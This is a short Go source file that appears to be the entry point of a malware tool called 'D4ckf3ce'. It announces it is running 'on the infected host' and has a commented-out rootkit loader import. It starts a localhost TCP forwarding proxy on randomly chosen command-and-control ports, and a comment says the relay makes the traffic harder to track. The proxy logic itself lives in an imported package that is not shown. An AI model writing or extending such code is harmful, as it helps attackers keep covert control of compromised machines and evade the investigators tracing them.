package main

import (
	"Duckface/proxy"
	"fmt"
	"time"
	// "./rootkitloader"
)

func main() {
	fmt.Println("Starting D4ckf3ce on the infected host...)")

	/* What should happen is , 2 rndmly ports in the range from 1200 - 22000 should be picked, with port != port2, those will be printed out to the console.
	   We enable forwarding on the listening Port, connect to the other rndmly choosen Port, and pipe our connection through there, this makes it harder to track.*/
	go proxy.EnableForwarding_tcp("127.0.0.1")
	time.Sleep(100 * time.Nanosecond) // Sleep first, to catch the first Iterration of Port generations, to be able to extract em.
	port_original := proxy.Ports_c2[0]
	port_to_be_forwarded_to := proxy.Ports_c2[1]
	fmt.Printf("Port_Original: %s, Port_Forwarded_To: %s", port_original, port_to_be_forwarded_to)

}
